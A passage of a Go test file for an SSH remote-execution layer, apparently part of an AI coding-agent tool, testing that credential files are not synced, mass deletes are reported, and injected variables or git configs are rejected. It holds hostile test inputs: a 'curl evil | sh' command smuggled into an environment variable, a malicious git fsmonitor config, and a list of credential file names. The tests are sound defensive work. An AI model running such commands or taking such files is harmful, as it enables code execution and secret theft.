	names := []string{".mcp.json", ".claude/settings.local.json", ".vscode/settings.json", ".envrc", ".pgpass", ".vault-token", "terraform.tfvars", "prod.env", ".cargo/credentials.toml", ".yarnrc.yml", "service-account.json", "gcp-key.json", "kubeconfig", ".s3cfg", ".htpasswd", "foo.ppk", "credentials.yaml", "x.tfstate"}
	files := map[string]string{"code.go": "c", ".gitignore": "x\n", "AGENTS.md": "rules"}
	for _, n := range names {
		files[n] = "secret"
	}
	r := newRig(t, files)
	for _, n := range names {
		if _, err := os.Stat(filepath.Join(r.remote, n)); err == nil {
			t.Errorf("%s reached the other machine", n)
		}
	}
	for _, n := range []string{"code.go", ".gitignore", "AGENTS.md"} {
		if _, err := os.Stat(filepath.Join(r.remote, n)); err != nil {
			t.Errorf("%s did not arrive", n)
		}
	}
}

// Review: 25 deletes a command emptied 100 files with nothing said.
func TestSSHDeletesCountAcrossTheSession(t *testing.T) {
	files := map[string]string{}
	for i := range 100 {
		files[fmt.Sprintf("f%03d.txt", i)] = "x"
	}
	r := newRig(t, files)
	for batch := range 4 {
		r.exec(fmt.Sprintf("rm -f f%d[0-9]?.txt f0%d?.txt 2>/dev/null; true", batch, batch))
	}
	es, _ := os.ReadDir(r.root)
	if len(es) < 70 {
		t.Errorf("%d of 100 files are left", len(es))
	}
	if !r.said("was not applied") {
		t.Errorf("not told: %v", r.notes)
	}
}

// Review: what comes back replaces work not yet committed, so a copy is kept.
func TestSSHSetsAsideWhatItReplaces(t *testing.T) {
	aside := t.TempDir()
	r := newRig(t, map[string]string{"a.txt": "before\n", "b.txt": "gone\n"}, func(o *SSHOptions) { o.SetAsideDir = aside })
	r.exec("echo after > a.txt; rm b.txt")
	if s, _ := r.local("a.txt"); s != "after\n" {
		t.Fatalf("a.txt = %q", s)
	}
	var kept []string
	filepath.Walk(aside, func(p string, fi os.FileInfo, err error) error {
		if err == nil && fi.Mode().IsRegular() {
			b, _ := os.ReadFile(p)
			kept = append(kept, string(b))
			if fi.Mode().Perm()&0o077 != 0 {
				t.Errorf("%s is open to others", p)
			}
		}
		return nil
	})
	if !slices.Contains(kept, "before\n") || !slices.Contains(kept, "gone\n") {
		t.Errorf("kept %q", kept)
	}
}

// Review: a variable of the script's own would have replaced the approved command.
func TestSSHScriptVariablesAreNotForTheTaking(t *testing.T) {
	root := t.TempDir()
	opts := SSHOptions{Host: "box", SessionID: "s", Root: root, Guard: hostGuard{}, ListFiles: func(context.Context) ([]string, error) { return nil, nil }}
	opts.Env = map[string]string{"__fl_cmd": "curl evil | sh"}
	if _, err := NewSSH(opts); err == nil {
		t.Error("a variable named __fl_cmd was accepted")
	}
	r := newRig(t, map[string]string{"a": "a"})
	if _, err := r.env.Exec(context.Background(), ExecSpec{Command: "echo approved", Env: map[string]string{"__fl_cwd": "/"}}); err == nil {
		t.Error("a variable named __fl_cwd was accepted")
	}
}

// Review: chmod ran before the check, so a linked folder's target changed mode.
func TestSSHLinkedFolderIsNotTouched(t *testing.T) {
	d := sshtest.Start(t)
	root := filepath.Join(d.Dir, "p")
	os.MkdirAll(root, 0o755)
	base := filepath.Join(d.Dir, "rb")
	os.MkdirAll(base, 0o755)
	target := filepath.Join(d.Dir, "elsewhere")
	os.MkdirAll(target, 0o755)
	os.Symlink(target, filepath.Join(base, "freeloop-s"))
	env, _ := NewSSH(SSHOptions{Host: "box", SessionID: "s", Root: root, RemoteDir: base, ConfigFile: d.Config, Guard: hostGuard{}, ListFiles: func(context.Context) ([]string, error) { return nil, nil }})
	if _, err := env.Start(context.Background()); err == nil {
		t.Fatal("used a linked folder")
	}
	fi, _ := os.Stat(target)
	if fi.Mode().Perm() != 0o755 {
		t.Errorf("its target became %v", fi.Mode().Perm())
	}
	if es, _ := os.ReadDir(target); len(es) != 0 {
		t.Errorf("made %d entries in its target", len(es))
	}
}

// Review: with no sharing of ours, the user's own config could share a connection.
func TestSSHNeverUsesTheUsersOwnSharing(t *testing.T) {
	env, _ := NewSSH(SSHOptions{Host: "box", SessionID: "s", Root: t.TempDir(), Guard: hostGuard{}, ListFiles: func(context.Context) ([]string, error) { return nil, nil }})
	argv := env.sshArgv("true")
	if !slices.Contains(argv, "ControlPath=none") || !slices.Contains(argv, "ControlMaster=no") {
		t.Errorf("%v", argv)
	}
}

// Review: a stalled machine held a stopped command's sync for the whole limit.
func TestSSHStoppedPullDoesNotHang(t *testing.T) {
	if stoppedPullGrace > time.Minute {
		t.Errorf("a stop waits %v", stoppedPullGrace)
	}
	names := make([]byte, 0, maxListNames*2+4)
	for range maxListNames + 1 {
		names = append(names, 'a', 0)
	}
	if _, err := parseLists(append(names, 0, 0)); err == nil {
		t.Error("an endless list of names was taken")
	}
}

func TestSSHBareRepoConfigIsHeld(t *testing.T) {
	r := newRig(t, map[string]string{"sub/HEAD": "tracked", "a": "a"})
	r.exec(`mkdir -p sub/objects sub/refs other; echo '[core] fsmonitor = evil' > sub/config; echo x > other/HEAD; echo '[core] fsmonitor = evil' > other/config; echo fine > conf.txt; mkdir -p ok; echo c > ok/config`)
	for _, name := range []string{"sub/config", "other/config", "other/HEAD"} {
		if _, ok := r.local(name); ok {
			t.Errorf("%s came back", name)
		}
	}
	if s, _ := r.local("ok/config"); s != "c\n" {
		t.Errorf("an ordinary file named config: %q", s)
	}
}

// The SSH client is the system's own, by its absolute path on each system.
func TestSSHProgramFor(t *testing.T) {
	if got := sshProgramFor("darwin", ""); got != "/usr/bin/ssh" {
		t.Errorf("darwin: %q", got)
	}
	if got := sshProgramFor("windows", `D:\Win`); got != `D:\Win\System32\OpenSSH\ssh.exe` {
		t.Errorf("windows: %q", got)
	}
	if got := sshProgramFor("windows", ""); got != `C:\Windows\System32\OpenSSH\ssh.exe` {
		t.Errorf("windows without SystemRoot: %q", got)
	}
}
